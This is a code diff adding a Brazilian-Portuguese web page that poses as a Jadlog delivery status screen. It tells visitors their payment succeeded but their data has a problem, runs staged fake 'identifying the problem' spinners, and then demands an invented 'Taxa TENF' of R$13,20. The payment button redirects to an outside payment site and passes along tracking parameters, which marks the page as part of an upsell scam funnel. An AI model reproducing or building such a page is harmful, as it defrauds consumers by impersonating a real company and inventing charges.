@@ -1,0 +1,216 @@
+﻿<!DOCTYPE html><html lang="pt"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>NF-e Eletronica</title>
+    <link rel="stylesheet" href="up3/css/products.css">
+    <link rel="stylesheet" href="up3/css/styles.css">
+    <link rel="stylesheet" href="up3/css/fonts.css">
+    <link rel="stylesheet" href="css2-2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+    <script>
+        localStorage.setItem("upsell", "up4");
+    </script>
+	<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet">
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+</head>
+<body>
+
+
+
+
+    <nav class="navbar" style="padding-top: 15px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+            <img src="up3/images/logo-jadlog.png" style="height: 5vh;" alt="Logo Central Vivara">
+        </div>
+
+        <div class="logo-central">
+        </div>
+
+       
+    </nav>
+
+
+
+    <div id="ad1">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Seus pedidos</p>
+
+        <div class="ad1">
+
+            <div style="margin-left: 3%; margin-right: 3%;">
+
+                <button class="styled-button">
+                    <div class="icon-container">
+                        <span class="material-symbols-outlined">local_shipping</span>
+                    </div>
+                    <span class="button-text">
+                        <span class="button-title">#6481749338</span>
+                    </span>
+                </button>
+    
+                <div class="entrega-container">
+                    <div class="entrega-header">
+                        Status
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container2">
+                            <span class="material-symbols-outlined">check</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pagamento concluído</div>
+                        </div>
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container3">
+                            <span class="material-symbols-outlined">warning</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pendência nos dados</div>
+                        </div>
+                    </div>
+                </div>
+    
+         
+    
+                <p style="text-align: center; margin-left: 3%; margin-right: 3%;">Seu pagamento foi concluido com sucesso, porém foi encontrado uma pendência nos seus dados. Clique abaixo para resolver esse problema!</p>
+    
+                <div class="button-container" style="padding-bottom: 20px;">
+                    <button class="styled-button2" onclick="showAd2()">
+                        <span class="button-text">
+                            <span class="button-title2">Resolver problema</span>
+                        </span>
+                        <span class="material-symbols-outlined" style="font-size: 32px; color: white;">arrow_forward_ios</span>
+                    </button>
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+    </div>
+
+
+    <div id="ad2" style="display: none;">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Problemas na transferência</p>
+    
+        <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
+    
+            <div style="padding-top: 2px;"></div>
+    
+            <div id="loadingGif" class="loading">
+                <div class="spinner"></div>
+            </div>
+    
+            <div class="entrega-container hidden" id="text1">
+                <div class="entrega-content">
+                    <div class="icon-container2">
+                        <span class="material-symbols-outlined">settings</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Estamos identificando o problema nos seus dados!</div>
+                    </div>
+                </div>
+            </div>
+    
+            <div id="loadingGif2" class="loading hidden">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text2" class="hidden entrega-container" style="margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: red;">
+                        <span class="material-symbols-outlined">warning</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Identificamos que há uma pendência nos seus dados de transferência!</div>
+                    </div>
+                </div>
+            </div>
+    
+            <div id="loadingGif3" class="loading hidden" style="padding-top: 20px;">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text3" class="hidden entrega-container" style="background-color: #d40303; margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+                        <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title" style="color: white">
+                            É necessário realizar o pagamento da <span class="bold">Taxa TENF</span> para corrigir a pendência e liberar sua transferência. O valor é único e fixo de <span class="bold">R$13,20</span>.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+
+<script>
+    
+    function openNewWindowWithUTMs(url) {
+    // Extrai os parâmetros UTM da URL atual
+    const currentUrlParams = new URLSearchParams(window.location.search);
+    let utms = '';
+
+    // Constrói a string dos parâmetros UTM
+    for (let [key, value] of currentUrlParams.entries()) {
+        if (key.startsWith('')) {
+            utms += `${key}=${value}&`;
+        }
+    }
+
+    // Remove o último '&'
+    if (utms) {
+        utms = utms.slice(0, -1); // remove the last '&'
+    }
+
+    // Adiciona os parâmetros UTM à URL especificada
+    const fullUrl = url + (utms? '?' + utms : '');
+
+    // Abre a nova janela ou guia com os parâmetros UTM
+    window.open(fullUrl, '_blank');
+}
+    
+</script>
+
+            <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
+                
+                <button class="styled-button2" onclick="checkout(event)">
+                    
+                    
+                    <span class="button-text">
+                        <span class="button-title2">Pagar o TENF</span>
+                    </span>
+                    <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                </button>
+            </div>
+
+            <div style="padding-bottom: 2px;"></div>
+
+        
+        <script>
+            function checkout(event) {
+              event.preventDefault(); 
+              var currentUrlParams = window.location.search;
+              window.location.href = "https://pay.taxaderestituicao.site/KV603kVkxBAgw8y" + currentUrlParams;
+            }
+          </script>
+
+        
+
+    
+    
+    
+    <script src="up3/js/scripts.js"></script>
+
+
+</body></html>
